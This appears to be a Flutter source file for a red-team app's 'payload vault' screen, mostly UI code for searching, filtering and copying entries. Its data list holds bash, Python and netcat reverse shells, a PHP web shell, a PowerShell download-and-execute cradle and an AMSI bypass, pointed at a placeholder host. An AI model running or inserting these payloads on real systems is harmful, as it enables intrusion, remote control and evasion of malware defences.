import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:gap/gap.dart';
import '../../../../core/theme/app_colors.dart';
import '../../../../core/localization/app_translations.dart';
import '../../../../shared/widgets/redops_header.dart';

class PayloadVaultScreen extends ConsumerStatefulWidget {
  const PayloadVaultScreen({super.key});

  @override
  ConsumerState<PayloadVaultScreen> createState() => _PayloadVaultScreenState();
}

class _PayloadVaultScreenState extends ConsumerState<PayloadVaultScreen> {
  String _searchQuery = '';
  String _selectedCategory = 'ALL';

  final List<String> _categories = [
    'ALL',
    'WEB',
    'WINDOWS',
    'LINUX',
    'EVASION',
    'NETWORKING'
  ];

  final List<_PayloadItem> _payloads = [
    _PayloadItem(
      title: 'Bash Reverse Shell',
      category: 'LINUX',
      description: 'Classic interactive bash reverse shell command.',
      code: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
      icon: Icons.terminal,
    ),
    _PayloadItem(
      title: 'PowerShell IEX Download',
      category: 'WINDOWS',
      description: 'Download and execute a script in memory.',
      code: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.10.10/shell.ps1\')"',
      icon: Icons.desktop_windows,
    ),
    _PayloadItem(
      title: 'PHP Web Shell (Simple)',
      category: 'WEB',
      description: 'One-liner PHP shell for command execution.',
      code: '<?php system(\$_GET["cmd"]); ?>',
      icon: Icons.language,
    ),
    _PayloadItem(
      title: 'Python Reverse Shell',
      category: 'LINUX',
      description: 'Python one-liner for a socket-based reverse shell.',
      code: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
      icon: Icons.code,
    ),
    _PayloadItem(
      title: 'Netcat Traditional',
      category: 'NETWORKING',
      description: 'Reverse shell using the -e flag (traditional nc).',
      code: 'nc -e /bin/sh 10.10.10.10 4444',
      icon: Icons.settings_input_component,
    ),
    _PayloadItem(
      title: 'AMSI Bypass (PowerShell)',
      category: 'EVASION',
      description: 'Patching AMSI in memory to bypass security checks.',
      code: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue(\$null,\$true)',
      icon: Icons.security_outlined,
    ),
  ];

  List<_PayloadItem> get _filteredPayloads {
    return _payloads.where((p) {
      final matchCat = _selectedCategory == 'ALL' || p.category == _selectedCategory;
      final matchSearch = p.title.toLowerCase().contains(_searchQuery.toLowerCase()) ||
          p.description.toLowerCase().contains(_searchQuery.toLowerCase());
      return matchCat && matchSearch;
    }).toList();
  }

  @override
  Widget build(BuildContext context) {
    final s = ref.watch(l10nProvider);
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return Scaffold(
      backgroundColor: Theme.of(context).scaffoldBackgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            RedOpsHeader(
              title: s.vaultTitle,
              subtitle: s.vaultSubtitle,
            ),
            _buildSearch(isDark, s),
            _buildCategories(isDark),
            Expanded(
              child: _buildList(s),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSearch(bool isDark, AppStrings s) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
      child: TextField(
        onChanged: (v) => setState(() => _searchQuery = v),
        style: TextStyle(
          color: isDark ? AppColors.textPrimary : AppColors.lightTextPrimary, 
          fontSize: 14, 
          fontFamily: 'monospace'
        ),
        decoration: InputDecoration(
          hintText: s.searchVault,
          prefixIcon: Icon(
            Icons.search, 
            color: isDark ? AppColors.redPrimary : AppColors.deepBlue, 
            size: 20
          ),
          filled: true,
          fillColor: isDark ? AppColors.bg800 : AppColors.lightSurface,
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: isDark ? AppColors.border : AppColors.lightBorder),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: isDark ? AppColors.redPrimary : AppColors.deepBlue, width: 2),
          ),
        ),
      ),
    ).animate().fadeIn(delay: 100.ms);
  }

  Widget _buildCategories(bool isDark) {
    final primaryColor = isDark ? AppColors.redPrimary : AppColors.deepBlue;

    return SizedBox(
      height: 38,
      child: ListView.separated(
        scrollDirection: Axis.horizontal,
        padding: const EdgeInsets.symmetric(horizontal: 20),
        itemCount: _categories.length,
        separatorBuilder: (_, __) => const SizedBox(width: 8),
        itemBuilder: (_, i) {
          final cat = _categories[i];
          final isSelected = cat == _selectedCategory;
          return GestureDetector(
            onTap: () => setState(() => _selectedCategory = cat),
            child: AnimatedContainer(
              duration: 200.ms,
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                color: isSelected ? primaryColor.withValues(alpha: 0.15) : (isDark ? AppColors.bg800 : AppColors.lightSurface),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                  color: isSelected ? primaryColor : (isDark ? AppColors.border : AppColors.lightBorder),
                  width: isSelected ? 1.5 : 1,
                ),
              ),
              child: Text(
                cat,
                style: TextStyle(
                  color: isSelected ? primaryColor : (isDark ? AppColors.textSecondary : AppColors.lightTextSecondary),
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1,
                ),
              ),
            ),
          );
        },
      ),
    ).animate().fadeIn(delay: 200.ms);
  }

  Widget _buildList(AppStrings s) {
    final items = _filteredPayloads;
    if (items.isEmpty) {
      return Center(
        child: Text(s.noDataFound, style: const TextStyle(color: AppColors.textTertiary)),
      );
    }
    return ListView.separated(
      padding: const EdgeInsets.all(20),
      itemCount: items.length,
      separatorBuilder: (_, __) => const Gap(16),
      itemBuilder: (context, index) => _PayloadCard(payload: items[index], index: index),
    );
  }
}

class _PayloadCard extends ConsumerStatefulWidget {
  const _PayloadCard({required this.payload, required this.index});
  final _PayloadItem payload;
  final int index;

  @override
  ConsumerState<_PayloadCard> createState() => _PayloadCardState();
}

class _PayloadCardState extends ConsumerState<_PayloadCard> {
  bool _isExpanded = false;
  bool _isCopied = false;

  void _copyToClipboard(AppStrings s) {
    Clipboard.setData(ClipboardData(text: widget.payload.code));
    setState(() => _isCopied = true);
    Future.delayed(const Duration(seconds: 2), () {
      if (mounted) setState(() => _isCopied = false);
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('${s.copied.toUpperCase()}: ${widget.payload.title.toUpperCase()}'),
        backgroundColor: AppColors.redPrimary,
        duration: const Duration(seconds: 1),
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final s = ref.watch(l10nProvider);
    final isDark = Theme.of(context).brightness == Brightness.dark;
    final primaryColor = isDark ? AppColors.redPrimary : AppColors.deepBlue;

    return Container(
      decoration: BoxDecoration(
        color: Theme.of(context).cardTheme.color,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: isDark ? AppColors.border : AppColors.lightBorder, width: 1),
        boxShadow: isDark ? null : [
          BoxShadow(color: Colors.black.withValues(alpha: 0.03), blurRadius: 10, offset: const Offset(0, 4))
        ],
      ),
      child: Column(
        children: [
          ListTile(
            onTap: () => setState(() => _isExpanded = !_isExpanded),
            leading: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: isDark ? AppColors.bg800 : AppColors.lightScaffold,
                borderRadius: BorderRadius.circular(8),
              ),
              child: Icon(widget.payload.icon, color: primaryColor, size: 20),
            ),
            title: Text(
              widget.payload.title,
              style: TextStyle(
                color: isDark ? AppColors.textPrimary : AppColors.lightTextPrimary, 
                fontWeight: FontWeight.bold, 
                fontSize: 14
              ),
            ),
            subtitle: Text(
              widget.payload.category,
              style: TextStyle(
                color: isDark ? AppColors.textTertiary : AppColors.lightTextTertiary, 
                fontSize: 10, 
                fontWeight: FontWeight.w900
              ),
            ),
            trailing: Icon(
              _isExpanded ? Icons.keyboard_arrow_up : Icons.keyboard_arrow_down,
              color: isDark ? AppColors.textTertiary : AppColors.lightTextTertiary,
            ),
          ),
          if (_isExpanded)
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Divider(color: AppColors.border),
                  const Gap(8),
                  Text(
                    widget.payload.description,
                    style: TextStyle(
                      color: isDark ? AppColors.textSecondary : AppColors.lightTextSecondary, 
                      fontSize: 13
                    ),
                  ),
                  const Gap(16),
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: isDark ? Colors.black : AppColors.lightTextPrimary,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: AppColors.border),
                    ),
                    child: Text(
                      widget.payload.code,
                      style: const TextStyle(
                        color: AppColors.textCode,
                        fontFamily: 'monospace',
                        fontSize: 12,
                      ),
                    ),
                  ),
                  const Gap(12),
                  SizedBox(
                    width: double.infinity,
                    child: OutlinedButton.icon(
                      onPressed: () => _copyToClipboard(s),
                      icon: Icon(_isCopied ? Icons.check : Icons.copy, size: 16),
                      label: Text(_isCopied ? s.copied.toUpperCase() : s.copyPayload),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: _isCopied ? AppColors.live : primaryColor,
                        side: BorderSide(color: _isCopied ? AppColors.live : primaryColor),
                      ),
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    ).animate().fadeIn(delay: (widget.index * 100).ms).slideX(begin: 0.1, end: 0);
  }
}

class _PayloadItem {
  final String title;
  final String category;
  final String description;
  final String code;
  final IconData icon;

  _PayloadItem({
    required this.title,
    required this.category,
    required this.description,
    required this.code,
    required this.icon,
  });
}
